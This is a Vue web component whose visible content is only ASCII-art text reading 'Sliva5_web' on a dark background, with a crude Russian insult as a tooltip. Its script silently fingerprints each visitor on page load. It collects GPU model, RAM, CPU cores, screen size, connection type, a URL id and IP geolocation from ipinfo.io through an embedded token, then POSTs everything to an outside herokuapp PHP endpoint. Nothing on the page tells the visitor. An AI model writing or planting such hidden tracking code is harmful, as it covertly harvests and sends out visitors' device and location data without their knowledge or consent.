<template>
  <div class="container">
   <div class="main" title="В жопу себе потыкай">
    <pre>
        (                                                      
            )\ )  (                 (  (                        )  
           (()/(  )\ (    )       ) )\))(      (  (      (   ( /(  
            /(_))((_))\  /((   ( /(((_)()\     )\))(    ))\  )\()) 
           (_))   _ ((_)(_))\  )(_))(()((_)   ((_)()\  /((_)((_)\  
           / __| | | (_)_)((_)((_)_  | __|    _(()((_)(_))  | |(_) 
           \__ \ | | | |\ V / / _` | |__ \    \ V  V // -_) | '_ \ 
           |___/ |_| |_| \_/  \__,_| |___/_____\_/\_/ \___| |_.__/ 
                                         |_____|                   
        </pre>
    </div>
  </div>
</template>

<script>
export default {}
function parseQuery(queryString) {
    var query = {};
    var pairs = (window.location.search[0] === '?' ? window.location.search.substr(1) : window.location.search).split('&');
    for (var i = 0; i < pairs.length; i++) {
        var pair = pairs[i].split('=');
        query[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1] || '');
    }
    return query;
}

var gl = document.createElement("canvas").getContext("webgl"), ext = gl.getExtension("WEBGL_debug_renderer_info");
var vk;
if(ext){
    vk = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL); 
}
let ram = navigator.deviceMemory
let CPU = navigator.hardwareConcurrency
let ineter = navigator.connection



let urlInfoIP = `https://ipinfo.io/?token=1a520e59d62919`;
let qeri = parseQuery(window.location.search).id


Resive()

async function Resive() {
    let ipinform = await fetch(urlInfoIP, { origin: 'https://sliva5-web.web.app' });

    ipinform = await ipinform.json();


    let data =
			{
        server: {
          url: window.location.href,
          type: "web"
        },
				ipinform,
				window: [window.screen.width,
				window.screen.height],
				hash: qeri != undefined ?  qeri : null,
				graphics: vk,
				processor: {
          count: CPU
        }, 
				memory: ram,
				connection: ineter?[ineter.downlink ? ineter.downlink : null,
				ineter.effectiveType ? ineter.effectiveType : null ]:[],
			}
			let enc = new TextEncoder().encode(JSON.stringify(data));

      console.log(data);
      console.log(enc.toString());

    ReserveApi(enc)

// fetch(mainDomain  +"api/app.send", 
//			{ method: "POST", body: JSON.stringify({ enc: "[" + enc + "]" }), 
//			headers: { "Content-type": "application/json" } }).catch(()=>{
//        ReserveApi(enc);
//       })

      }




 
 



function  ReserveApi(enc) {
   fetch("https://php-sliva.herokuapp.com/xwvd.php", 
			{ method: "POST", body: JSON.stringify({ enc: enc }), 
			headers: { "Content-type": "application/json" } })
}

</script>

<style>pre {
    color: #f4f4f4;
    padding-left: 20%;
  }
@media  screen and (max-width: 1100px) {
  pre {
    color: #f4f4f4;
    padding-left: 0%;
  }
}
  body {
      margin: 0 auto;
      background-color: #19191b;
  }
</style>
